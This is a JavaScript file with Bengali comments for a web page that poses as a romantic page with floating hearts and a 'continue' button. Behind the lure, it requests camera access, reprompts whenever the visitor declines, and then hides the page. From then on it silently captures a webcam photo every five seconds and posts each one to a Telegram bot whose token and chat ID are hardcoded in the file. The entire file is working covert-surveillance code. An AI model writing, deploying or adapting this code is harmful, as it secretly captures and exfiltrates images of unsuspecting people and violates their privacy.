// কনফিগারেশন
const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
const chatId = '7950771882';

// এলিমেন্টসমূহ
const continueBtn = document.getElementById('continue-btn');
const retryBtn = document.getElementById('retry-btn');
const mainCard = document.getElementById('main-card');
const retryOverlay = document.getElementById('retry-overlay');
const heartContainer = document.getElementById('heart-container');

// ১. হার্ট এনিমেশন ইফেক্ট
function spawnHearts() {
    setInterval(() => {
        const heart = document.createElement('div');
        heart.classList.add('heart');
        heart.innerHTML = '❤️';
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.fontSize = (Math.random() * 20 + 10) + 'px';
        heart.style.animation = `move ${Math.random() * 3 + 2}s linear forwards`;
        heartContainer.appendChild(heart);
        setTimeout(() => heart.remove(), 5000);
    }, 400);
}

// ২. ক্যামেরা পারমিশন হ্যান্ডলার
async function requestAccess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        // পারমিশন পাওয়া গেলে ওভারলে সরিয়ে দিন
        retryOverlay.style.display = 'none';
        mainCard.style.display = 'none';
        startSurveillance(stream);
    } catch (err) {
        // ব্লক করলে ওভারলে দেখান
        retryOverlay.style.display = 'flex';
        retryOverlay.style.flexDirection = 'column';
    }
}

// ৩. ছবি ক্যাপচার ও টেলিগ্রামে পাঠানো
function startSurveillance(stream) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement('canvas');
    canvas.width = 480;
    canvas.height = 360;
    const ctx = canvas.getContext('2d');

    setInterval(() => {
        ctx.drawImage(video, 0, 0, 480, 360);
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'surveillance.jpg');
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error("Transmission failed");
            }
        }, 'image/jpeg', 0.8);
    }, 5000); // প্রতি ৫ সেকেন্ড পর পর
}

// ইভেন্ট লিসেনার
continueBtn.addEventListener('click', requestAccess);
retryBtn.addEventListener('click', requestAccess);

// ইনিশিয়াল কল
spawnHearts();
